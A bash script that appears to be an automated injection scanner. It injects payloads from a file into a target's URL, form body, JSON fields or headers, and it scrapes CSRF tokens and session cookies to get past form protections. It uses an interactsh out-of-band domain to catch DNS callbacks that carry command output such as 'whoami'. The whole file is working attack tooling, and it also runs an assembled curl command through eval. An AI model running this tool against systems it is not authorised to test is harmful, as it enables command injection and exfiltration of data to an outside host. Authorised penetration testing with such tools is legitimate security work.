#!/bin/bash

INPUT_FILE="input.json"
PAYLOADS_FILE="payloads.txt"
OUTPUT_FILE="results.json"
TMP_LOG=$(mktemp)
COOKIE_JAR=$(mktemp)
trap "rm -f $TMP_LOG $COOKIE_JAR" EXIT

echo "[" > "$OUTPUT_FILE"

method=$(jq -r '.method' "$INPUT_FILE" | tr '[:lower:]' '[:upper:]')
url_template=$(jq -r '.url' "$INPUT_FILE")
headers=$(jq -r '.headers // {}' "$INPUT_FILE")
body=$(jq -c '.body // empty' "$INPUT_FILE")
inject_field=$(jq -r '.inject_field // "email"' "$INPUT_FILE")
inject_into=$(jq -r '.inject_into // "body"' "$INPUT_FILE")
content_type=$(jq -r '.content_type // "application/x-www-form-urlencoded"' "$INPUT_FILE")

# Start interactsh-client
interactsh-client -json -o "$TMP_LOG" > "$TMP_LOG" 2>&1 &
PID=$!

# Wait for interactsh-client to return a domain
for i in {1..10}; do
    DOMAIN=$(strings "$TMP_LOG" | grep -oE '[a-zA-Z0-9.-]+\.(oast\.[a-z]+|interact\.sh|oast\.pro|oast\.online)' | head -n1)
    [[ -n "$DOMAIN" ]] && break
    sleep 1
done

if [[ -z "$DOMAIN" ]]; then
    echo "interactsh-client did not return a domain"
    kill $PID
    exit 1
fi

echo "[*] Using OOB domain: $DOMAIN"

first=true
while IFS= read -r raw_payload || [[ -n "$raw_payload" ]]; do
    reflected_payload="${raw_payload//\{\{DOMAIN\}\}/$DOMAIN}"
    blind_payload="${raw_payload//\{\{DOMAIN\}\}/$DOMAIN}"
    target_url="$url_template"
    post_data=""
    location="$inject_into"
    matched_dns="false"
    dns_response="null"

    # Reflected injection (GET or POST body)
    if [[ "$method" == "GET" ]]; then
        if [[ "$target_url" == *"INJECT_HERE"* ]]; then
            target_url="${target_url/INJECT_HERE/$reflected_payload}"
        else
            echo "Skipping payload: no INJECT_HERE in URL"
            continue
        fi
    elif [[ "$method" == "POST" && "$inject_into" == "body" ]]; then
        post_data=""
        for key in $(echo "$body" | jq -r 'keys[]'); do
            val=$(echo "$body" | jq -r --arg k "$key" '.[$k]')
            if [[ "$val" == *"INJECT_HERE"* ]]; then
                val="${val/INJECT_HERE/$reflected_payload}"
            fi
            post_data+="${key}=$(printf '%s' "$val" | jq -s -R -r @uri)&"
        done
        post_data=${post_data%&}
    fi

    # Build reflected curl
    curl_cmd="curl -s --max-time 15 -X $method"
    for key in $(echo "$headers" | jq -r 'keys[]'); do
        val=$(echo "$headers" | jq -r --arg k "$key" '.[$k]')
        curl_cmd+=" -H \"$key: $val\""
    done
    [[ "$method" == "POST" ]] && curl_cmd+=" -d \"$post_data\" \"$target_url\"" || curl_cmd+=" \"$target_url\""

    response=$(eval "$curl_cmd")

    # Clean/escape output
    clean_output=$(echo "$response" | perl -0777 -ne 'print $1 if /<pre[^>]*>(.*?)<\/pre>/s')
    [[ -z "$clean_output" ]] && clean_output=$(echo "$response" | sed -e 's/<[^>]*>//g' | sed '/^$/d')
    escaped_output=$(printf '%s' "$clean_output" | jq -Rs '.')

    # Blind injection
    csrf=""
    session=""
    final_url="$url_template"
    final_data="$body"

    html=$(curl -sk -c "$COOKIE_JAR" "$url_template")
    csrf=$(echo "$html" | grep -oP 'name="csrf" value="\K[^"]+')
    session=$(grep "session" "$COOKIE_JAR" | awk '{print $7}')

    curl_headers=()
    for key in $(echo "$headers" | jq -r 'keys[]'); do
        val=$(echo "$headers" | jq -r --arg k "$key" '.[$k]')
        curl_headers+=("-H" "$key: $val")
    done
    [[ -n "$session" ]] && curl_headers+=("-H" "Cookie: session=$session")

    if [[ "$inject_into" == "json" ]]; then
        json_body=$(echo "$body" | jq --arg payload "$blind_payload" --arg field "$inject_field" '.[$field] = $payload')
        curl -sk -X "$method" "$url_template" "${curl_headers[@]}" -H "Content-Type: application/json" --data "$json_body" > /dev/null
    elif [[ "$inject_into" == "body" ]]; then
        [[ -n "$csrf" ]] && final_data="csrf=$csrf&"
        final_data+=$(echo "$body" | jq -r 'to_entries | map("\(.key)=\(.value)") | join("&")' | sed "s/$inject_field=[^&]*/$inject_field=$blind_payload/")
        curl -sk -X "$method" "$url_template" "${curl_headers[@]}" -H "Content-Type: $content_type" --data "$final_data" > /dev/null
    elif [[ "$inject_into" == "params" ]]; then
        final_url="${url_template//\{\{INJECT\}\}/$blind_payload}"
        curl -sk -X "$method" "$final_url" "${curl_headers[@]}" -H "Content-Type: $content_type" > /dev/null
    elif [[ "$inject_into" == "headers" ]]; then
        curl_headers+=("-H" "$inject_field: $blind_payload")
        curl -sk -X "$method" "$url_template" "${curl_headers[@]}" -H "Content-Type: $content_type" --data "$body" > /dev/null
    fi

    sleep 10

    # Extract clean DNS interaction (like whoami.DOMAIN) from TMP_LOG
    dns_entry=$(jq -r 'select(has("full-id")) | .["full-id"]' "$TMP_LOG" | head -n1)
    if [ "$first" = true ]; then
        first=false
    else
        echo "," >> "$OUTPUT_FILE"
    fi

    if [[ -n "$dns_entry" ]]; then
        matched_dns="true"
        dns_response="$dns_entry"
    else
        dns_response=""
    fi

    jq -n \
    --arg payload "$reflected_payload" \
    --arg url "$target_url" \
    --arg location "$location" \
    --argjson output "$escaped_output" \
    --arg blind_detected "$matched_dns" \
    --arg dns_response "$dns_response" \
    '{payload: $payload, url: $url, location: $location, output: $output, blind: $blind_detected, dns_response: $dns_response}' >> "$OUTPUT_FILE"
    # echo "," >> "$OUTPUT_FILE"
done < "$PAYLOADS_FILE"

# Finalize JSON
# sed -i '$ d' "$OUTPUT_FILE"
echo "]" >> "$OUTPUT_FILE"

kill $PID > /dev/null 2>&1
echo "Scan complete. Results saved to $OUTPUT_FILE"
